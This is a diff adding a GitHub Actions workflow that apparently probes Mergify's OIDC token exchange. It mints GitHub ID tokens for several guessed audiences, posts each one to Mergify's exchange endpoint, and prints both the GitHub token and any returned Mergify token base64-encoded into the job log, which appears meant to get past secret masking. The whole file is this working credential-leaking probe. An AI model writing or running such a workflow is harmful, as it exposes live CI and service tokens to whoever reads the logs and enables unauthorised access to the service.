@@ -1,0 +1,41 @@
+name: oidc-exchange
+on:
+  workflow_dispatch:
+    inputs:
+      audiences:
+        description: space-separated audience candidates
+        required: false
+        default: "https://api.mergify.com mergify https://mergify.com api.mergify.com mergify-api"
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - name: exchange loop
+        env:
+          AUDS: ${{ inputs.audiences }}
+        run: |
+          set -u
+          BASE="${ACTIONS_ID_TOKEN_REQUEST_URL}"
+          for AUD in $AUDS; do
+            echo "########## AUD=$AUD"
+            RESP=$(curl -sS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${BASE}&audience=${AUD}")
+            TOKEN=$(echo "$RESP" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')
+            if [ -z "$TOKEN" ]; then echo "no token: $RESP"; continue; fi
+            echo "--- payload:"
+            echo "$TOKEN" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null; echo
+            echo "--- token_b64:"
+            printf '%s' "$TOKEN" | base64 -w0; echo
+            echo "--- exchange:"
+            BODY=$(python3 -c 'import json,sys;print(json.dumps({"id_token":sys.argv[1]}))' "$TOKEN")
+            HTTP=$(curl -sS -o /tmp/x.out -w '%{http_code}' -X POST "https://api.mergify.com/v1/ci/oidc/exchange" -H "content-type: application/json" -H "accept: application/json" --data-binary "$BODY")
+            echo "status=$HTTP"
+            head -c 1500 /tmp/x.out; echo
+            if [ "$HTTP" = "200" ]; then
+              echo "--- response_token_b64:"
+              python3 -c 'import json,sys;print(json.load(open("/tmp/x.out"))["token"])' | base64 -w0; echo
+            fi
+          done
